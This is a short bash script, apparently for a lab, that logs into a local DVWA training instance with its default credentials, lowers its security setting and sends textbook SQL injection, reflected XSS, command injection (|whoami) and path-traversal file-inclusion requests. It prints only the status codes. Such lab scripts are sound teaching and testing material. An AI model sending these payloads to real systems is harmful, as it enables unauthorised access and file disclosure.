#!/bin/bash
TARGET="http://192.168.1.11"

# Login fresh
rm -f /tmp/dvwa_cookie.txt
curl -s -c /tmp/dvwa_cookie.txt -b /tmp/dvwa_cookie.txt \
  -L -d "username=admin&password=password&Login=Login" \
  "$TARGET/dvwa/login.php" > /dev/null

# Set security low
curl -s -L -c /tmp/dvwa_cookie.txt -b /tmp/dvwa_cookie.txt \
  -d "security=low&seclev_submit=Submit" \
  "$TARGET/dvwa/security.php" > /dev/null

echo "[+] Login selesai"

# SQLi
echo "[*] SQL Injection..."
curl -s -L -b /tmp/dvwa_cookie.txt \
  "$TARGET/dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" \
  -o /dev/null -w "SQLi: %{http_code}\n"

# XSS
echo "[*] XSS..."
curl -s -L -b /tmp/dvwa_cookie.txt \
  "$TARGET/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>" \
  -o /dev/null -w "XSS: %{http_code}\n"

# Command Injection
echo "[*] Command Injection..."
curl -s -L -b /tmp/dvwa_cookie.txt \
  -d "ip=127.0.0.1|whoami&Submit=Submit" \
  "$TARGET/dvwa/vulnerabilities/exec/" \
  -o /dev/null -w "CMDi: %{http_code}\n"

# LFI
echo "[*] LFI..."
curl -s -L -b /tmp/dvwa_cookie.txt \
  "$TARGET/dvwa/vulnerabilities/fi/?page=../../../../../../windows/win.ini" \
  -o /dev/null -w "LFI: %{http_code}\n"

echo "[+] Semua serangan selesai!"
